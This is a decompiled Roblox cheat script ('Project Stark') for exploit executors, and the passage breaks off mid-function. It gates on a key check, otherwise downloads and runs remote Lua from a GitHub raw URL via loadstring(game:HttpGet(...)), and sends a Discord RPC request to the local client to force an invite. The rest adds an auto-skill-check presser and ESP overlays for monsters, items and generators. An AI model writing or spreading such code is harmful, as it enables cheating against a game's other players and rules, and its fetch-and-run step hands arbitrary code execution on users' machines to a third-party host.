local v1 = {}
local _ = require
v1["script.lua"] = function()
	local v2 = game:GetService("Players")
	local v_u_3 = v2.LocalPlayer:FindFirstChild("Project Stark Key Check")
	local v_u_4 = false
	local function v7(p_u_5)
		pcall(function()
			-- upvalues: (ref) p_u_5
			local v6 = game:GetService("HttpService");
			(syn and syn.request or request)({
				["Url"] = "http://127.0.0.1:6463/rpc?v=1",
				["Method"] = "POST",
				["Headers"] = {
					["Content-Type"] = "application/json",
					["Origin"] = "https://discord.com"
				},
				["Body"] = v6:JSONEncode({
					["cmd"] = "INVITE_BROWSER",
					["args"] = {
						["code"] = p_u_5
					},
					["nonce"] = v6:GenerateGUID(false)
				})
			})
		end)
	end
	local v8 = false
	if true then
		if v_u_3 and v_u_3.Value == true then
			pcall(function()
				-- upvalues: (ref) v_u_3
				v_u_3:Destroy()
				warn("Urbanstorn was here")
			end)
			v8 = true
		else
			pcall(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/Urbanstormm/Project-Stark/main/Main.lua"))()
			end)
			v7("vgYZApyrZC")
		end
	else
		warn("[Project Stark] Key check DISABLED")
		v8 = true
	end
	if v8 then
		local v_u_9 = game:GetService("RunService")
		local v_u_10 = game:GetService("UserInputService")
		local v_u_11 = game:GetService("VirtualInputManager")
		local v_u_12 = workspace.CurrentCamera
		local v13 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Urbanstormm/Project-Stark/main/UiLib.lua"))():Window("Project Stark\n\225\180\176\225\181\131\226\129\191\225\181\136\202\184\'\203\162 \225\181\130\225\181\146\202\179\203\161\225\181\136", Color3.fromRGB(120, 81, 169))
		local v14 = v13:Tab("Main")
		local v15 = v13:Tab("Monster ESP")
		local v16 = v13:Tab("Item ESP")
		local v17 = v13:Tab("Generator ESP")
		local v18 = v13:Tab("Extras")
		local v19 = v13:Tab("Settings")
		local v20 = v13:Tab("Credits")
		local v_u_21 = v2.LocalPlayer:WaitForChild("PlayerGui")
		local v_u_22 = false
		local v_u_23 = 0.1
		local v_u_24 = 10
		local v_u_25 = 0
		local function v_u_40(p26, p27)
			local v28 = p26.AbsolutePosition
			local v29 = p26.AbsoluteSize
			local v30 = p27.AbsolutePosition
			local v31 = p27.AbsoluteSize
			local v32 = v28.X
			local v33 = v28.X + v29.X
			local v34 = v28.Y
			local v35 = v28.Y + v29.Y
			local v36 = v30.X
			local v37 = v30.X + v31.X
			local v38 = v30.Y
			local v39 = v30.Y + v31.Y
			return v36 < v33 and (v32 < v37 and (v38 < v35 and v34 < v39))
		end
		local function v_u_46(p41, p42)
			-- upvalues: (ref) v_u_24
			local v43 = p41.AbsoluteSize
			local v44 = p42.AbsoluteSize
			local v45 = math.abs(v43.X - v44.X)
			math.abs(v43.Y - v44.Y)
			return v45 <= v_u_24
		end
		local function v_u_47()
			-- upvalues: (ref) v_u_11
			task.wait(0.05)
			v_u_11:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
			task.wait(0.05)
			v_u_11:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
		end
		v14:Label("This is the only thing on this page :)")
		v14:Toggle("Auto-Minigames", function(p48)
			-- upvalues: (ref) v_u_22
			v_u_22 = p48
		end)
		v_u_9.RenderStepped:Connect(function()
			-- upvalues: (ref) v_u_22, (ref) v_u_21, (ref) v_u_40, (ref) v_u_46, (ref) v_u_25, (ref) v_u_23, (ref) v_u_47
			if v_u_22 then
				local v49 = false
				local v50 = v_u_21:FindFirstChild("ScreenGui")
				if v50 then
					local v51 = v50:FindFirstChild("Menu")
					if v51 then
						local v52 = v51:FindFirstChild("SkillCheckFrame")
						if v52 and v52.Visible then
							local v53 = v52:FindFirstChild("Marker")
							local v54 = v52:FindFirstChild("GoldArea")
							v49 = v53 and (v54 and v_u_40(v53, v54)) and true or v49
						end
					end
				end
				local v55 = v_u_21:FindFirstChild("CircleSkillCheckGui")
				if v55 then
					local v56 = v55:FindFirstChild("SkillCheckFrame")
					if v56 and v56.Visible then
						local v57 = v56:FindFirstChild("Container")
						if v57 then
							local v58 = v57:FindFirstChild("ShrinkingCircle")
							local v59 = v57:FindFirstChild("YellowCircle")
							v49 = v58 and (v59 and v_u_46(v58, v59)) and true or v49
						end
					end
				end
				if v49 then
					local v60 = tick()
					if v_u_23 <= v60 - v_u_25 then
						v_u_47()
						v_u_25 = v60
					end
				end
			end
		end)
		local v_u_61 = {
			["Settings"] = {
				["Enabled"] = false,
				["ShowBox"] = true,
				["ShowText"] = true,
				["ShowName"] = true,
				["ShowDistance"] = true,
				["BoxColor"] = Color3.fromRGB(255, 0, 0),
				["TextColor"] = Color3.fromRGB(255, 0, 0),
				["BoxThickness"] = 1,
				["TextSize"] = 15,
				["UpdateInterval"] = 2,
				["BoxFilled"] = false,
				["BoxTransparency"] = 0.5,
				["TextTransparency"] = 0.5
			},
			["Active"] = {},
			["Connections"] = {}
		}
		local function v_u_67(p62)
			-- upvalues: (ref) v_u_61
			if not v_u_61.Active[p62] then
				local v63 = {
					["Monster"] = p62,
					["Drawings"] = {},
					["BoxLines"] = {}
				}
				for _ = 1, 4 do
					local v64 = Drawing.new("Line")
					v64.Thickness = v_u_61.Settings.BoxThickness
					v64.Color = v_u_61.Settings.BoxColor
					v64.Transparency = v_u_61.Settings.BoxTransparency
					v64.Visible = false
					table.insert(v63.BoxLines, v64)
					table.insert(v63.Drawings, v64)
				end
				if v_u_61.Settings.BoxFilled then
					local v65 = Drawing.new("Quad")
					v65.Color = v_u_61.Settings.BoxColor
					v65.Transparency = 0.3
					v65.Filled = true
					v65.Visible = false
					v63.FilledBox = v65
					table.insert(v63.Drawings, v65)
				end
				local v66 = Drawing.new("Text")
				v66.Size = v_u_61.Settings.TextSize
				v66.Color = v_u_61.Settings.TextColor
				v66.Transparency = v_u_61.Settings.TextTransparency
				v66.Outline = true
				v66.OutlineColor = Color3.new(0, 0, 0)
				v66.Center = true
				v66.Font = 2
				v66.Visible = false
				v63.Text = v66
				table.insert(v63.Drawings, v66)
				v_u_61.Active[p62] = v63
			end
		end
		local function v_u_74(p68)
			-- upvalues: (ref) v_u_61
			local v69 = v_u_61.Active[p68]
			if v69 then
				local v70, v71, v72 = ipairs(v69.Drawings)
				while true do
					local v_u_73
					v72, v_u_73 = v70(v71, v72)
					if v72 == nil then
						break
					end
					pcall(function()
						-- upvalues: (ref) v_u_73
						v_u_73:Remove()
					end)
				end
				v_u_61.Active[p68] = nil
			end
		end
		local function v_u_113()
			-- upvalues: (ref) v_u_61, (ref) v_u_74, (ref) v_u_12
			if v_u_61.Settings.Enabled then
				local v75, v76, v77 = pairs(v_u_61.Active)
				while true do
					local v78
					v77, v78 = v75(v76, v77)
					if v77 == nil then
						break
					end
					if v77 and v77.Parent then
						local v79 = v77:FindFirstChild("HumanoidRootPart") or (v77:FindFirstChild("Torso") or v77:FindFirstChild("Head") or (v77.PrimaryPart or v77:FindFirstChildOfClass("BasePart")))
						if v79 then
							local v80, v81 = v_u_12:WorldToViewportPoint(v79.Position)
							if v81 then
								local v82 = (v_u_12.CFrame.Position - v79.Position).Magnitude
								if v78.Text and (v_u_61.Settings.ShowText and (v_u_61.Settings.ShowName or v_u_61.Settings.ShowDistance)) then
									local v83 = not v_u_61.Settings.ShowName and "" or v77.Name
									if v_u_61.Settings.ShowDistance then
										if v83 ~= "" then
											v83 = v83 .. " "
										end
										v83 = v83 .. string.format("[%.0fm]", v82)
									end
									v78.Text.Text = v83
									v78.Text.Position = Vector2.new(v80.X, v80.Y - 20)
									v78.Text.Visible = true
									v78.Text.Color = v_u_61.Settings.TextColor
									v78.Text.Size = v_u_61.Settings.TextSize
									v78.Text.Transparency = v_u_61.Settings.TextTransparency
								else
									v78.Text.Visible = false
								end
								if v_u_61.Settings.ShowBox and #v78.BoxLines == 4 then
									local v84 = v79.Size
									local v85 = v_u_12:WorldToViewportPoint((v79.CFrame * CFrame.new(-v84.X / 2, v84.Y / 2, 0)).Position)
									local v86 = v_u_12:WorldToViewportPoint((v79.CFrame * CFrame.new(v84.X / 2, v84.Y / 2, 0)).Position)
									local v87 = v_u_12:WorldToViewportPoint((v79.CFrame * CFrame.new(v84.X / 2, -v84.Y / 2, 0)).Position)
									local v88 = v_u_12:WorldToViewportPoint((v79.CFrame * CFrame.new(-v84.X / 2, -v84.Y / 2, 0)).Position)
									local v89 = {
										Vector2.new(v85.X, v85.Y),
										Vector2.new(v86.X, v86.Y),
										Vector2.new(v87.X, v87.Y),
										Vector2.new(v88.X, v88.Y)
									}
									for v90 = 1, 4 do
										local v91 = v78.BoxLines[v90]
										local v92 = v90 % 4 + 1
										v91.From = v89[v90]
										v91.To = v89[v92]
										v91.Color = v_u_61.Settings.BoxColor
										v91.Thickness = v_u_61.Settings.BoxThickness
										v91.Transparency = v_u_61.Settings.BoxTransparency
										v91.Visible = true
									end
									if v78.FilledBox and v_u_61.Settings.BoxFilled then
										v78.FilledBox.PointA = v89[1]
										v78.FilledBox.PointB = v89[2]
										v78.FilledBox.PointC = v89[3]
										v78.FilledBox.PointD = v89[4]
										v78.FilledBox.Color = v_u_61.Settings.BoxColor
										v78.FilledBox.Visible = true
									end
								else
									local v93, v94, v95 = ipairs(v78.BoxLines)
									while true do
										local v96
										v95, v96 = v93(v94, v95)
										if v95 == nil then
											break
										end
										v96.Visible = false
									end
									if v78.FilledBox then
										v78.FilledBox.Visible = false
									end
								end
							else
								local v97, v98, v99 = ipairs(v78.Drawings)
								while true do
									local v100
									v99, v100 = v97(v98, v99)
									if v99 == nil then
										break
									end
									v100.Visible = false
								end
							end
						else
							local v101, v102, v103 = ipairs(v78.Drawings)
							while true do
								local v104
								v103, v104 = v101(v102, v103)
								if v103 == nil then
									break
								end
								v104.Visible = false
							end
						end
					else
						v_u_74(v77)
					end
				end
			else
				local v105, v106, v107 = pairs(v_u_61.Active)
				while true do
					local v108
					v107, v108 = v105(v106, v107)
					if v107 == nil then
						break
					end
					local v109, v110, v111 = ipairs(v108.Drawings)
					while true do
						local v112
						v111, v112 = v109(v110, v111)
						if v111 == nil then
							break
						end
						v112.Visible = false
					end
				end
			end
		end
		local function v_u_127()
			-- upvalues: (ref) v_u_61, (ref) v_u_67
			local function v_u_125(p_u_114, p_u_115)
				-- upvalues: (ref) v_u_61, (ref) v_u_67, (ref) v_u_125
				if p_u_115 <= 10 then
					pcall(function()
						-- upvalues: (ref) p_u_114, (ref) v_u_61, (ref) v_u_67, (ref) v_u_125, (ref) p_u_115
						local v116 = p_u_114
						local v117, v118, v119 = ipairs(v116:GetChildren())
						while true do
							local v120
							v119, v120 = v117(v118, v119)
							if v119 == nil then
								break
							end
							if v120.Name == "Monsters" or v120.Name:lower():find("monster") then
								local v121, v122, v123 = ipairs(v120:GetChildren())
								while true do
									local v124
									v123, v124 = v121(v122, v123)
									if v123 == nil then
										break
									end
									if v124:IsA("Model") and not v_u_61.Active[v124] then
										v_u_67(v124)
									end
								end
							end
							if v120:IsA("Folder") or v120:IsA("Model") then
								v_u_125(v120, p_u_115 + 1)
							end
						end
					end)
				end
			end
			local v126 = workspace:FindFirstChild("CurrentRoom")
			if v126 then
				v_u_125(v126, 0)
			end
			v_u_125(workspace, 0)
		end
		local function v_u_128()
			-- upvalues: (ref) v_u_61, (ref) v_u_127, (ref) v_u_9, (ref) v_u_113
			if not v_u_61.Connections.Update then
				v_u_127()
				v_u_61.Connections.Update = v_u_9.RenderStepped:Connect(v_u_113)
				v_u_61.Connections.Scan = task.spawn(function()
					-- upvalues: (ref) v_u_61, (ref) v_u_127
					while v_u_61.Connections.Update do
						task.wait(v_u_61.Settings.UpdateInterval)
						v_u_127()
					end
				end)
			end
		end
		local function v_u_133()
			-- upvalues: (ref) v_u_61, (ref) v_u_74
			if v_u_61.Connections.Update then
				v_u_61.Connections.Update:Disconnect()
				v_u_61.Connections.Update = nil
			end
			if v_u_61.Connections.Scan then
				task.cancel(v_u_61.Connections.Scan)
				v_u_61.Connections.Scan = nil
			end
			local v129, v130, v131 = pairs(v_u_61.Active)
			while true do
				local v132
				v131, v132 = v129(v130, v131)
				if v131 == nil then
					break
				end
				v_u_74(v131)
			end
		end
		v15:Label("Monster ESP Master")
		v15:Toggle("Monster ESP Enabled", function(p134)
			-- upvalues: (ref) v_u_61, (ref) v_u_128, (ref) v_u_133
			v_u_61.Settings.Enabled = p134
			if p134 then
				v_u_128()
			else
				v_u_133()
			end
		end)
		v15:Label("Box Settings")
		v15:Toggle("Show Box", function(p135)
			-- upvalues: (ref) v_u_61
			v_u_61.Settings.ShowBox = p135
		end)
		v15:Toggle("Box Filled", function(p136)
			-- upvalues: (ref) v_u_61, (ref) v_u_133, (ref) v_u_128
			v_u_61.Settings.BoxFilled = p136
			v_u_133()
			if v_u_61.Settings.Enabled then
				v_u_128()
			end
		end)
		v15:Colorpicker("Box Color", v_u_61.Settings.BoxColor, function(p137)
			-- upvalues: (ref) v_u_61
			v_u_61.Settings.BoxColor = p137
		end)
		v15:Slider("Box Thickness", 1, 5, v_u_61.Settings.BoxThickness, function(p138)
			-- upvalues: (ref) v_u_61
			v_u_61.Settings.BoxThickness = p138
		end)
		v15:Slider("Box Transparency", 1, 10, math.floor(v_u_61.Settings.BoxTransparency * 10), function(p139)
			-- upvalues: (ref) v_u_61
			v_u_61.Settings.BoxTransparency = p139 / 10
		end)
		v15:Label("Text Settings")
		v15:Toggle("Show Text", function(p140)
			-- upvalues: (ref) v_u_61
			v_u_61.Settings.ShowText = p140
		end)
		v15:Toggle("Show Name", function(p141)
			-- upvalues: (ref) v_u_61
			v_u_61.Settings.ShowName = p141
		end)
		v15:Toggle("Show Distance", function(p142)
			-- upvalues: (ref) v_u_61
			v_u_61.Settings.ShowDistance = p142
		end)
		v15:Colorpicker("Text Color", v_u_61.Settings.TextColor, function(p143)
			-- upvalues: (ref) v_u_61
			v_u_61.Settings.TextColor = p143
		end)
		v15:Slider("Text Size", 10, 30, v_u_61.Settings.TextSize, function(p144)
			-- upvalues: (ref) v_u_61
			v_u_61.Settings.TextSize = p144
		end)
		v15:Slider("Text Transparency", 1, 10, math.floor(v_u_61.Settings.TextTransparency * 10), function(p145)
			-- upvalues: (ref) v_u_61
			v_u_61.Settings.TextTransparency = p145 / 10
		end)
		v15:Label("General Settings")
		v15:Slider("Scan Interval (seconds)", 1, 10, v_u_61.Settings.UpdateInterval, function(p146)
			-- upvalues: (ref) v_u_61
			v_u_61.Settings.UpdateInterval = p146
		end)
		v15:Button("Refresh Monster ESP", function()
			-- upvalues: (ref) v_u_133, (ref) v_u_61, (ref) v_u_128
			v_u_133()
			if v_u_61.Settings.Enabled then
				v_u_128()
			end
		end)
		local v_u_147 = {
			["Settings"] = {
				["Enabled"] = false,
				["ShowText"] = true,
				["ShowName"] = true,
				["ShowDistance"] = true,
				["TextColor"] = Color3.fromRGB(255, 255, 255),
				["TextSize"] = 15,
				["UpdateInterval"] = 2,
				["TextTransparency"] = 0.5
			},
			["Active"] = {},
			["Connections"] = {}
		}
		local function v_u_151(p148)
			-- upvalues: (ref) v_u_147
			if not v_u_147.Active[p148] then
				local v149 = {
					["Item"] = p148,
					["Drawings"] = {}
				}
				local v150 = Drawing.new("Text")
				v150.Size = v_u_147.Settings.TextSize
				v150.Color = v_u_147.Settings.TextColor
				v150.Transparency = v_u_147.Settings.TextTransparency
				v150.Outline = true
				v150.OutlineColor = Color3.new(0, 0, 0)
				v150.Center = true
				v150.Font = 2
				v150.Visible = false
				v149.Text = v150
				table.insert(v149.Drawings, v150)
				v_u_147.Active[p148] = v149
			end
		end
		local function v_u_158(p152)
			-- upvalues: (ref) v_u_147
			local v153 = v_u_147.Active[p152]
			if v153 then
				local v154, v155, v156 = ipairs(v153.Drawings)
				while true do
					local v_u_157
					v156, v_u_157 = v154(v155, v156)
					if v156 == nil then
						break
					end
					pcall(function()
						-- upvalues: (ref) v_u_157
						v_u_157:Remove()
					end)
				end
				v_u_147.Active[p152] = nil
			end
		end
		local function v_u_184()
			-- upvalues: (ref) v_u_147, (ref) v_u_158, (ref) v_u_12
			if v_u_147.Settings.Enabled then
				local v159, v160, v161 = pairs(v_u_147.Active)
				while true do
					local v162
					v161, v162 = v159(v160, v161)
					if v161 == nil then
						break
					end
					if v161 and v161.Parent then
						local v163 = v161.PrimaryPart or v161:FindFirstChild("Handle") or (v161:FindFirstChild("Part") or v161:FindFirstChildOfClass("BasePart"))
						if v163 then
							local v164, v165 = v_u_12:WorldToViewportPoint(v163.Position)
							if v165 then
								local v166 = (v_u_12.CFrame.Position - v163.Position).Magnitude
								if v162.Text and (v_u_147.Settings.ShowText and (v_u_147.Settings.ShowName or v_u_147.Settings.ShowDistance)) then
									local v167 = not v_u_147.Settings.ShowName and "" or v161.Name
									if v_u_147.Settings.ShowDistance then
										if v167 ~= "" then
											v167 = v167 .. " "
										end
										v167 = v167 .. string.format("[%.0fm]", v166)
									end
									v162.Text.Text = v167
									v162.Text.Position = Vector2.new(v164.X, v164.Y)
									v162.Text.Visible = true
									v162.Text.Color = v_u_147.Settings.TextColor
									v162.Text.Size = v_u_147.Settings.TextSize
									v162.Text.Transparency = v_u_147.Settings.TextTransparency
								else
									v162.Text.Visible = false
								end
							else
								local v168, v169, v170 = ipairs(v162.Drawings)
								while true do
									local v171
									v170, v171 = v168(v169, v170)
									if v170 == nil then
										break
									end
									v171.Visible = false
								end
							end
						else
							local v172, v173, v174 = ipairs(v162.Drawings)
							while true do
								local v175
								v174, v175 = v172(v173, v174)
								if v174 == nil then
									break
								end
								v175.Visible = false
							end
						end
					else
						v_u_158(v161)
					end
				end
			else
				local v176, v177, v178 = pairs(v_u_147.Active)
				while true do
					local v179
					v178, v179 = v176(v177, v178)
					if v178 == nil then
						break
					end
					local v180, v181, v182 = ipairs(v179.Drawings)
					while true do
						local v183
						v182, v183 = v180(v181, v182)
						if v182 == nil then
							break
						end
						v183.Visible = false
					end
				end
			end
		end
		local function v_u_198()
			-- upvalues: (ref) v_u_147, (ref) v_u_151
			local function v_u_196(p_u_185, p_u_186)
				-- upvalues: (ref) v_u_147, (ref) v_u_151, (ref) v_u_196
				if p_u_186 <= 10 then
					pcall(function()
						-- upvalues: (ref) p_u_185, (ref) v_u_147, (ref) v_u_151, (ref) v_u_196, (ref) p_u_186
						local v187 = p_u_185
						local v188, v189, v190 = ipairs(v187:GetChildren())
						while true do
							local v191
							v190, v191 = v188(v189, v190)
							if v190 == nil then
								break
							end
							if v191.Name == "Items" or v191.Name:lower():find("items") then
								local v192, v193, v194 = ipairs(v191:GetChildren())
								while true do
									local v195
									v194, v195 = v192(v193, v194)
									if v194 == nil then
										break
									end
									if not v_u_147.Active[v195] then
										v_u_151(v195)
									end
								end
							end
							if v191:IsA("Folder") or v191:IsA("Model") then
								v_u_196(v191, p_u_186 + 1)
							end
						end
					end)
				end
			end
			local v197 = workspace:FindFirstChild("CurrentRoom")
			if v197 then
				v_u_196(v197, 0)
			end
			v_u_196(workspace, 0)
		end
		local function v_u_199()
			-- upvalues: (ref) v_u_147, (ref) v_u_198, (ref) v_u_9, (ref) v_u_184
			if not v_u_147.Connections.Update then
				v_u_198()
				v_u_147.Connections.Update = v_u_9.RenderStepped:Connect(v_u_184)
				v_u_147.Connections.Scan = task.spawn(function()
					-- upvalues: (ref) v_u_147, (ref) v_u_198
					while v_u_147.Connections.Update do
						task.wait(v_u_147.Settings.UpdateInterval)
						v_u_198()
					end
				end)
			end
		end
		local function v_u_204()
			-- upvalues: (ref) v_u_147, (ref) v_u_158
			if v_u_147.Connections.Update then
				v_u_147.Connections.Update:Disconnect()
				v_u_147.Connections.Update = nil
			end
			if v_u_147.Connections.Scan then
				task.cancel(v_u_147.Connections.Scan)
				v_u_147.Connections.Scan = nil
			end
			local v200, v201, v202 = pairs(v_u_147.Active)
			while true do
				local v203
				v202, v203 = v200(v201, v202)
				if v202 == nil then
					break
				end
				v_u_158(v202)
			end
		end
		v16:Label("Item ESP Master")
		v16:Toggle("Item ESP Enabled", function(p205)
			-- upvalues: (ref) v_u_147, (ref) v_u_199, (ref) v_u_204
			v_u_147.Settings.Enabled = p205
			if p205 then
				v_u_199()
			else
				v_u_204()
			end
		end)
		v16:Label("Text Settings")
		v16:Toggle("Show Text", function(p206)
			-- upvalues: (ref) v_u_147
			v_u_147.Settings.ShowText = p206
		end)
		v16:Toggle("Show Name", function(p207)
			-- upvalues: (ref) v_u_147
			v_u_147.Settings.ShowName = p207
		end)
		v16:Toggle("Show Distance", function(p208)
			-- upvalues: (ref) v_u_147
			v_u_147.Settings.ShowDistance = p208
		end)
		v16:Colorpicker("Text Color", v_u_147.Settings.TextColor, function(p209)
			-- upvalues: (ref) v_u_147
			v_u_147.Settings.TextColor = p209
		end)
		v16:Slider("Text Size", 10, 30, v_u_147.Settings.TextSize, function(p210)
			-- upvalues: (ref) v_u_147
			v_u_147.Settings.TextSize = p210
		end)
		v16:Slider("Text Transparency", 1, 10, math.floor(v_u_147.Settings.TextTransparency * 10), function(p211)
			-- upvalues: (ref) v_u_147
			v_u_147.Settings.TextTransparency = p211 / 10
		end)
		v16:Label("General Settings")
		v16:Slider("Scan Interval (seconds)", 1, 10, v_u_147.Settings.UpdateInterval, function(p212)
			-- upvalues: (ref) v_u_147
			v_u_147.Settings.UpdateInterval = p212
		end)
		v16:Button("Refresh Item ESP", function()
			-- upvalues: (ref) v_u_204, (ref) v_u_147, (ref) v_u_199
			v_u_204()
			if v_u_147.Settings.Enabled then
				v_u_199()
			end
		end)
		local v_u_213 = {
			["Settings"] = {
				["Enabled"] = false,
				["ShowBox"] = true,
				["ShowText"] = true,
				["ShowName"] = true,
				["ShowDistance"] = true,
				["BoxColor"] = Color3.fromRGB(138, 43, 226),
				["TextColor"] = Color3.fromRGB(138, 43, 226),
				["BoxThickness"] = 1,
				["TextSize"] = 15,
				["UpdateInterval"] = 2,
				["BoxTransparency"] = 0.5,
				["TextTransparency"] = 0.5
			},
			["Active"] = {},
			["Connections"] = {}
		}
		local function v_u_218(p214)
			-- upvalues: (ref) v_u_213
			if not v_u_213.Active[p214] then
				local v215 = {
					["Generator"] = p214,
					["Drawings"] = {},
					["BoxLines"] = {}
				}
				for _ = 1, 12 do
					local v216 = Drawing.new("Line")
					v216.Thickness = v_u_213.Settings.BoxThickness
					v216.Color = v_u_213.Settings.BoxColor
					v216.Transparency = v_u_213.Settings.BoxTransparency
					v216.Visible = false
					table.insert(v215.BoxLines, v216)
					table.insert(v215.Drawings, v216)
				end
				local v217 = Drawing.new("Text")
				v217.Size = v_u_213.Settings.TextSize
				v217.Color = v_u_213.Settings.TextColor
				v217.Transparency = v_u_213.Settings.TextTransparency
				v217.Outline = true
				v217.OutlineColor = Color3.new(0, 0, 0)
				v217.Center = true
				v217.Font = 2
				v217.Visible = false
				v215.Text = v217
				table.insert(v215.Drawings, v217)
				v_u_213.Active[p214] = v215
			end
		end
		local function v_u_225(p219)
			-- upvalues: (ref) v_u_213
			local v220 = v_u_213.Active[p219]
			if v220 then
				local v221, v222, v223 = ipairs(v220.Drawings)
				while true do
					local v_u_224
					v223, v_u_224 = v221(v222, v223)
					if v223 == nil then
						break
					end
					pcall(function()
						-- upvalues: (ref) v_u_224
						v_u_224:Remove()
					end)
				end
				v_u_213.Active[p219] = nil
			end
		end
		local function v_u_279()
			-- upvalues: (ref) v_u_213, (ref) v_u_225, (ref) v_u_12
			if v_u_213.Settings.Enabled then
				local v226, v227, v228 = pairs(v_u_213.Active)
				while true do
					local v229
					v228, v229 = v226(v227, v228)
					if v228 == nil then
						break
					end
					if v228 and v228.Parent then
						local v_u_230 = v228:FindFirstChild("Model")
						if v_u_230 and v_u_230:IsA("Model") then
							local v_u_231 = nil
							local v_u_232 = nil
							pcall(function()
								-- upvalues: (ref) v_u_231, (ref) v_u_232, (ref) v_u_230
								local v233, v234 = v_u_230:GetBoundingBox()
								v_u_232 = v234
								v_u_231 = v233
							end)
							if v_u_231 and v_u_232 then
								local v235 = v228:FindFirstChild("Prompt")
								local v236 = nil
								if v235 and v235:IsA("ProximityPrompt") then
									local v237 = v235.Parent
									if v237 and v237:IsA("BasePart") then
										v236 = v237.Position
									end
								end
								local v238, v239 = v_u_12:WorldToViewportPoint(v_u_231.Position)
								if v239 then
									local v240 = (v_u_12.CFrame.Position - v_u_231.Position).Magnitude
									if v229.Text and (v_u_213.Settings.ShowText and (v_u_213.Settings.ShowName or v_u_213.Settings.ShowDistance)) then
										local v241 = not v_u_213.Settings.ShowName and "" or v228.Name
										if v_u_213.Settings.ShowDistance then
											if v241 ~= "" then
												v241 = v241 .. " "
											end
											v241 = v241 .. string.format("[%.0fm]", v240)
										end
										v229.Text.Text = v241
										if v236 then
											local v242, _ = v_u_12:WorldToViewportPoint(v236)
											v229.Text.Position = Vector2.new(v242.X, v242.Y)
										else
											v229.Text.Position = Vector2.new(v238.X, v238.Y)
										end
										v229.Text.Visible = true
										v229.Text.Color = v_u_213.Settings.TextColor
										v229.Text.Size = v_u_213.Settings.TextSize
										v229.Text.Transparency = v_u_213.Settings.TextTransparency
									else
										v229.Text.Visible = false
									end
									if v_u_213.Settings.ShowBox and #v229.BoxLines == 12 then
										local v243 = {
											(v_u_231 * CFrame.new(-v_u_232.X / 2, v_u_232.Y / 2, -v_u_232.Z / 2)).Position,
											(v_u_231 * CFrame.new(v_u_232.X / 2, v_u_232.Y / 2, -v_u_232.Z / 2)).Position,
											(v_u_231 * CFrame.new(v_u_232.X / 2, -v_u_232.Y / 2, -v_u_232.Z / 2)).Position,
											(v_u_231 * CFrame.new(-v_u_232.X / 2, -v_u_232.Y / 2, -v_u_232.Z / 2)).Position,
											(v_u_231 * CFrame.new(-v_u_232.X / 2, v_u_232.Y / 2, v_u_232.Z / 2)).Position,
											(v_u_231 * CFrame.new(v_u_232.X / 2, v_u_232.Y / 2, v_u_232.Z / 2)).Position,
											(v_u_231 * CFrame.new(v_u_232.X / 2, -v_u_232.Y / 2, v_u_232.Z / 2)).Position,
											(v_u_231 * CFrame.new(-v_u_232.X / 2, -v_u_232.Y / 2, v_u_232.Z / 2)).Position
										}
										local v244, v245, v246 = ipairs(v243)
										local v247 = {}
										while true do
											local v248
											v246, v248 = v244(v245, v246)
											if v246 == nil then
												break
											end
											local v249, _ = v_u_12:WorldToViewportPoint(v248)
											table.insert(v247, Vector2.new(v249.X, v249.Y))
										end
										local v250, v251, v252 = ipairs({
											{ 1, 2 },
											{ 2, 3 },
											{ 3, 4 },
											{ 4, 1 },
											{ 5, 6 },
											{ 6, 7 },
											{ 7, 8 },
											{ 8, 5 },
											{ 1, 5 },
											{ 2, 6 },
											{ 3, 7 },
											{ 4, 8 }
										})
										while true do
											local v253
											v252, v253 = v250(v251, v252)
											if v252 == nil then
												break
											end
											local v254 = v229.BoxLines[v252]
											v254.From = v247[v253[1]]
											v254.To = v247[v253[2]]
											v254.Color = v_u_213.Settings.BoxColor
											v254.Thickness = v_u_213.Settings.BoxThickness
											v254.Transparency = v_u_213.Settings.BoxTransparency
											v254.Visible = true
										end
									else
										local v255, v256, v257 = ipairs(v229.BoxLines)
										while true do
											local v258
											v257, v258 = v255(v256, v257)
											if v257 == nil then
												break
											end
											v258.Visible = false
										end
									end
								else
									local v259, v260, v261 = ipairs(v229.Drawings)
									while true do
										local v262
										v261, v262 = v259(v260, v261)
										if v261 == nil then
											break
										end
										v262.Visible = false
									end
								end
							else
								local v263, v264, v265 = ipairs(v229.Drawings)
								while true do
									local v266
									v265, v266 = v263(v264, v265)
									if v265 == nil then
										break
									end
									v266.Visible = false
								end
							end
						else
							local v267, v268, v269 = ipairs(v229.Drawings)
							while true do
								local v270
								v269, v270 = v267(v268, v269)
								if v269 == nil then
									break
								end
								v270.Visible = false
							end
						end
					else
						v_u_225(v228)
					end
				end
			else
				local v271, v272, v273 = pairs(v_u_213.Active)
				while true do
					local v274
					v273, v274 = v271(v272, v273)
					if v273 == nil then
						break
					end
					local v275, v276, v277 = ipairs(v274.Drawings)
					while true do
						local v278
						v277, v278 = v275(v276, v277)
						if v277 == nil then
							break
						end
						v278.Visible = false
					end
				end
			end
		end
		local function v_u_293()
			-- upvalues: (ref) v_u_213, (ref) v_u_218
			local function v_u_291(p_u_280, p_u_281)
				-- upvalues: (ref) v_u_213, (ref) v_u_218, (ref) v_u_291
				if p_u_281 <= 10 then
					pcall(function()
						-- upvalues: (ref) p_u_280, (ref) v_u_213, (ref) v_u_218, (ref) v_u_291, (ref) p_u_281
						local v282 = p_u_280
						local v283, v284, v285 = ipairs(v282:GetChildren())
						while true do
							local v286
							v285, v286 = v283(v284, v285)
							if v285 == nil then
								break
							end
							if v286.Name == "Generators" or v286.Name:lower():find("generators") then
								local v287, v288, v289 = ipairs(v286:GetChildren())
								while true do
									local v290
									v289, v290 = v287(v288, v289)
									if v289 == nil then
										break
									end
									if v290:FindFirstChild("Prompt") and not v_u_213.Active[v290] then
										v_u_218(v290)
									end
								end
							end
							if v286:IsA("Folder") or v286:IsA("Model") then
								v_u_291(v286, p_u_281 + 1)
							end
						end
					end)
				end
			end
			local v292 = workspace:FindFirstChild("CurrentRoom")
			if v292 then
				v_u_291(v292, 0)
			end
			v_u_291(workspace, 0)
		end
		local function v_u_294()
			-- upvalues: (ref) v_u_213, (ref) v_u_293, (ref) v_u_9, (ref) v_u_279
			if not v_u_213.Connections.Update then
				v_u_293()
				v_u_213.Connections.Update = v_u_9.RenderStepped:Connect(v_u_279)
				v_u_213.Connections.Scan = task.spawn(function()
					-- upvalues: (ref) v_u_213, (ref) v_u_293
					while v_u_213.Connections.Update do
						task.wait(v_u_213.Settings.UpdateInterval)
						v_u_293()
					end
				end)
			end
		end
		local function v_u_299()
			-- upvalues: (ref) v_u_213, (ref) v_u_225
			if v_u_213.Connections.Update then
				v_u_213.Connections.Update:Disconnect()
